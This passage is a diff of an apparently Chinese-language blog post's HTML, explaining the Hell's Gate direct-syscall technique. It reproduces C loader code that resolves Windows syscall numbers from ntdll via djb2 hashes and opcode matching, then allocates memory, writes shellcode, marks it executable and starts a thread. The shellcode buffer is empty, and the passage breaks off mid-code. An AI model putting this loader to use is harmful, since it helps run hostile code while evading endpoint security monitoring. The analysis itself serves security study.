+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	WORD    wSystemCall;	<span style="color:#75715e">// Syscall Number
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} VX_TABLE_ENTRY, <span style="color:#f92672">*</span> PVX_TABLE_ENTRY;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_VX_TABLE</span> {	<span style="color:#75715e">// 用来存放每一个系统调用的函数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	VX_TABLE_ENTRY NtAllocateVirtualMemory;
+</span></span><span style="display:flex;"><span>	VX_TABLE_ENTRY NtProtectVirtualMemory;
+</span></span><span style="display:flex;"><span>	VX_TABLE_ENTRY NtCreateThreadEx;
+</span></span><span style="display:flex;"><span>	VX_TABLE_ENTRY NtWaitForSingleObject;
+</span></span><span style="display:flex;"><span>} VX_TABLE, <span style="color:#f92672">*</span> PVX_TABLE;
+</span></span></code></pre></div><p>然后又定义了几个函数原型</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>PTEB <span style="color:#a6e22e">RtlGetThreadEnvironmentBlock</span>();
+</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetImageExportDirectory</span>(
+</span></span><span style="display:flex;"><span>	_In_ PVOID                     pModuleBase,
+</span></span><span style="display:flex;"><span>	_Out_ PIMAGE_EXPORT_DIRECTORY<span style="color:#f92672">*</span> ppImageExportDirectory
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetVxTableEntry</span>(
+</span></span><span style="display:flex;"><span>	_In_ PVOID pModuleBase,
+</span></span><span style="display:flex;"><span>	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
+</span></span><span style="display:flex;"><span>	_In_ PVX_TABLE_ENTRY pVxTableEntry
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Payload</span>(
+</span></span><span style="display:flex;"><span>	_In_ PVX_TABLE pVxTable
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>PVOID <span style="color:#a6e22e">VxMoveMemory</span>(
+</span></span><span style="display:flex;"><span>	_Inout_ PVOID dest,
+</span></span><span style="display:flex;"><span>	_In_    <span style="color:#66d9ef">const</span> PVOID src,
+</span></span><span style="display:flex;"><span>	_In_    SIZE_T len
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>extern 定义了俩函数，是存放在<code>hellsgate.asm</code>里的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> VOID <span style="color:#a6e22e">HellsGate</span>(WORD wSystemCall);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#a6e22e">HellDescent</span>();
+</span></span></code></pre></div><p><img src="/images/HellsGate/image-20220325085154625.png" alt="image-20220325085154625"></p>
 <p><code>HellsGate</code>：用来设置调用号</p>
 <p><code>HellDescent</code>：用来模拟系统调用进行调用</p>
 <p>然后进入到main方法，定义了TEB，又从TEB里找到了PEB，再解析导出表，进行判断</p>
 <p><img src="/images/HellsGate/image-20220325085215881.png" alt="image-20220325085215881"></p>
 <p>接下来就是定义上面结构体里，给它Api的Hash，Api的Hash就是<code>djb2</code>函数生成的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">VX_TABLE Table <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
-Table.NtAllocateVirtualMemory.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf5bd373480a6b89b</span>;
-<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetVxTableEntry(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtAllocateVirtualMemory))
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
-
-Table.NtCreateThreadEx.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x64dc7db288c5015f</span>;
-<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetVxTableEntry(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtCreateThreadEx))
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
-
-Table.NtProtectVirtualMemory.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x858bcb1046fb6a37</span>;
-<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetVxTableEntry(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtProtectVirtualMemory))
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
-
-Table.NtWaitForSingleObject.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc6a2fa174e551bcb</span>;
-<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetVxTableEntry(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtWaitForSingleObject))
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
-</code></pre></div><p>直接测试下是不是<code>djb2</code>生成的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>VX_TABLE Table <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>Table.NtAllocateVirtualMemory.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf5bd373480a6b89b</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetVxTableEntry(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtAllocateVirtualMemory))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Table.NtCreateThreadEx.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x64dc7db288c5015f</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetVxTableEntry(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtCreateThreadEx))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Table.NtProtectVirtualMemory.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x858bcb1046fb6a37</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetVxTableEntry(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtProtectVirtualMemory))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Table.NtWaitForSingleObject.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc6a2fa174e551bcb</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetVxTableEntry(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtWaitForSingleObject))
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span></code></pre></div><p>直接测试下是不是<code>djb2</code>生成的</p>
 <p><img src="/images/HellsGate/image-20220325085253695.png" alt="image-20220325085253695"></p>
 <p>然后就得重点看下<code>GetVxTableEntry</code>函数，因为这步就是取Syscall Number的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL <span style="color:#a6e22e">GetVxTableEntry</span>(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
-	PDWORD pdwAddressOfFunctions <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
-	PDWORD pdwAddressOfNames <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNames);
-	PWORD pwAddressOfNameOrdinales <span style="color:#f92672">=</span> (PWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
-
-	<span style="color:#66d9ef">for</span> (WORD cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; cx <span style="color:#f92672">&lt;</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>NumberOfNames; cx<span style="color:#f92672">++</span>) {
-		PCHAR pczFunctionName <span style="color:#f92672">=</span> (PCHAR)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfNames[cx]);
-		PVOID pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
-
-		<span style="color:#66d9ef">if</span> (djb2(pczFunctionName) <span style="color:#f92672">==</span> pVxTableEntry<span style="color:#f92672">-&gt;</span>dwHash) {
-			pVxTableEntry<span style="color:#f92672">-&gt;</span>pAddress <span style="color:#f92672">=</span> pFunctionAddress;
-
-			<span style="color:#75715e">// Quick and dirty fix in case the function has been hooked
-</span><span style="color:#75715e"></span>			WORD cw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-			<span style="color:#66d9ef">while</span> (TRUE) {
-				<span style="color:#75715e">// check if syscall, in this case we are too far
-</span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0f</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x05</span>)
-					<span style="color:#66d9ef">return</span> FALSE;
-
-				<span style="color:#75715e">// check if ret, in this case we are also probaly too far
-</span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc3</span>)
-					<span style="color:#66d9ef">return</span> FALSE;
-
-				<span style="color:#75715e">// First opcodes should be :
-</span><span style="color:#75715e"></span>				<span style="color:#75715e">//    MOV R10, RCX
-</span><span style="color:#75715e"></span>				<span style="color:#75715e">//    MOV RCX, &lt;syscall&gt;
-</span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
-					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
-					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
-					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
-					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
-					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
-					BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> cw);
-					BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> cw);
-					pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low;
-					<span style="color:#66d9ef">break</span>;
-				}
-
-				cw<span style="color:#f92672">++</span>;
-			};
-		}
-	}
-
-	<span style="color:#66d9ef">return</span> TRUE;
-}
-</code></pre></div><p>三个参数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetVxTableEntry</span>(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
+</span></span><span style="display:flex;"><span>	PDWORD pdwAddressOfFunctions <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
+</span></span><span style="display:flex;"><span>	PDWORD pdwAddressOfNames <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNames);
+</span></span><span style="display:flex;"><span>	PWORD pwAddressOfNameOrdinales <span style="color:#f92672">=</span> (PWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (WORD cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; cx <span style="color:#f92672">&lt;</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>NumberOfNames; cx<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>		PCHAR pczFunctionName <span style="color:#f92672">=</span> (PCHAR)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfNames[cx]);
+</span></span><span style="display:flex;"><span>		PVOID pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (djb2(pczFunctionName) <span style="color:#f92672">==</span> pVxTableEntry<span style="color:#f92672">-&gt;</span>dwHash) {
+</span></span><span style="display:flex;"><span>			pVxTableEntry<span style="color:#f92672">-&gt;</span>pAddress <span style="color:#f92672">=</span> pFunctionAddress;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Quick and dirty fix in case the function has been hooked
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			WORD cw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">while</span> (TRUE) {
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// check if syscall, in this case we are too far
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0f</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x05</span>)
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// check if ret, in this case we are also probaly too far
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc3</span>)
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// First opcodes should be :
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#75715e">//    MOV R10, RCX
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#75715e">//    MOV RCX, &lt;syscall&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>					BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>					BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>					pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low;
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				cw<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>			};
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>三个参数</p>
 <p><code>pModuleBase</code>：ntdll的地址</p>
 <p><code>pImageExportDirectory</code>：导出表</p>
 <p><code>pVxTableEntry</code>：需要找到函数的<code>_VX_TABLE_ENTRY</code>结构</p>
@@ -391,46 +391,46 @@ Table.NtWaitForSingleObject.dwHash <span style="color:#f92672">=</span> <span st
 <p>其实这里 这样看 更清楚</p>
 <p><img src="/images/HellsGate/image-20220325085415026.png" alt="image-20220325085415026"></p>
 <p>这里的if其实就是为了判断</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">r10</span>,<span style="color:#66d9ef">rcx</span>
-<span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">eax</span>,*
-</code></pre></div><p>然后判断成功了，就左移搞一个0地址，与本来的syscall number进行或运算</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">r10</span>,<span style="color:#66d9ef">rcx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">eax</span>,*
+</span></span></code></pre></div><p>然后判断成功了，就左移搞一个0地址，与本来的syscall number进行或运算</p>
 <p><img src="/images/HellsGate/image-20220325085453110.png" alt="image-20220325085453110"></p>
 <p><img src="/images/HellsGate/image-20220325085504593.png" alt="image-20220325085504593"></p>
 <p>最后就赋值了<code>_VX_TABLE_ENTRY</code>结构里的<code>wSystemCall</code></p>
 <p>main函数里的几个<code>GetVxTableEntry</code>就是取<code>Syscall Number</code></p>
 <p>最后调用了Payload，就是执行我们所需要的API。把那个大结构体传过去</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL <span style="color:#a6e22e">Payload</span>(PVX_TABLE pVxTable) {
-	NTSTATUS status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>;
-	<span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-
-	<span style="color:#75715e">// Allocate memory for the shellcode
-</span><span style="color:#75715e"></span>	PVOID lpAddress <span style="color:#f92672">=</span> NULL;
-	SIZE_T sDataSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(shellcode);
-	HellsGate(pVxTable<span style="color:#f92672">-&gt;</span>NtAllocateVirtualMemory.wSystemCall);		<span style="color:#75715e">// 设置调用号
-</span><span style="color:#75715e"></span>	status <span style="color:#f92672">=</span> HellDescent((HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>lpAddress, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>sDataSize, MEM_COMMIT, PAGE_READWRITE);	<span style="color:#75715e">// 利用NtAllocateVirtualMemory进行申请内存  (HANDLE)-1就是GetCurrentProcess()
-</span><span style="color:#75715e"></span>
-	<span style="color:#75715e">// Write Memory
-</span><span style="color:#75715e"></span>	VxMoveMemory(lpAddress, shellcode, <span style="color:#66d9ef">sizeof</span>(shellcode));
-
-	<span style="color:#75715e">// Change page permissions
-</span><span style="color:#75715e"></span>	ULONG ulOldProtect <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	HellsGate(pVxTable<span style="color:#f92672">-&gt;</span>NtProtectVirtualMemory.wSystemCall);
-	status <span style="color:#f92672">=</span> HellDescent((HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>lpAddress, <span style="color:#f92672">&amp;</span>sDataSize, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>ulOldProtect);
-
-	<span style="color:#75715e">// Create thread
-</span><span style="color:#75715e"></span>	HANDLE hHostThread <span style="color:#f92672">=</span> INVALID_HANDLE_VALUE;
-	HellsGate(pVxTable<span style="color:#f92672">-&gt;</span>NtCreateThreadEx.wSystemCall);
-	status <span style="color:#f92672">=</span> HellDescent(<span style="color:#f92672">&amp;</span>hHostThread, <span style="color:#ae81ff">0x1FFFFF</span>, NULL, (HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
-
-	<span style="color:#75715e">// Wait for 1 seconds
-</span><span style="color:#75715e"></span>	LARGE_INTEGER Timeout;
-	Timeout.QuadPart <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">50000000</span>;
-	HellsGate(pVxTable<span style="color:#f92672">-&gt;</span>NtWaitForSingleObject.wSystemCall);
-	status <span style="color:#f92672">=</span> HellDescent(hHostThread, TRUE, <span style="color:#f92672">&amp;</span>Timeout);
-
-	<span style="color:#66d9ef">return</span> TRUE;
-}
-</code></pre></div><p>这里面就是设置调用号，然后进行系统调用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">Payload</span>(PVX_TABLE pVxTable) {
+</span></span><span style="display:flex;"><span>	NTSTATUS status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Allocate memory for the shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PVOID lpAddress <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	SIZE_T sDataSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(shellcode);
+</span></span><span style="display:flex;"><span>	HellsGate(pVxTable<span style="color:#f92672">-&gt;</span>NtAllocateVirtualMemory.wSystemCall);		<span style="color:#75715e">// 设置调用号
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	status <span style="color:#f92672">=</span> HellDescent((HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>lpAddress, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>sDataSize, MEM_COMMIT, PAGE_READWRITE);	<span style="color:#75715e">// 利用NtAllocateVirtualMemory进行申请内存  (HANDLE)-1就是GetCurrentProcess()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Write Memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	VxMoveMemory(lpAddress, shellcode, <span style="color:#66d9ef">sizeof</span>(shellcode));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Change page permissions
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ULONG ulOldProtect <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	HellsGate(pVxTable<span style="color:#f92672">-&gt;</span>NtProtectVirtualMemory.wSystemCall);
+</span></span><span style="display:flex;"><span>	status <span style="color:#f92672">=</span> HellDescent((HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>lpAddress, <span style="color:#f92672">&amp;</span>sDataSize, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>ulOldProtect);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create thread
